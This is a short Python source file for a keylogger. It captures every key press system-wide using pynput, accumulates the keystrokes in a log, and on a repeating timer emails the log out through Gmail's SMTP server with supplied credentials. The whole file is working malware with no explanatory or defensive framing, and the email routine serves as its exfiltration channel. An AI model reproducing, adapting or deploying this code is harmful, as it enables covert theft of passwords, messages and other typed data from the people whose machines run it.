#!/usr/bin/env python

from pynput import keyboard
import threading
import smtplib



class Keylogger():

    def __init__(self, time_interval, email,password):
        self.log = "it's started!"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def procces_key_press(self,key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.tab:
                current_key = "\t"
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)


    def report(self):
        self.send_email(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_email(self,mail, password, message):
        host = smtplib.SMTP("smtp.gmail.com", 587)
        host.starttls()
        host.login(mail, password)
        host.sendmail(mail, mail, message)
        host.quit()
    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.procces_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
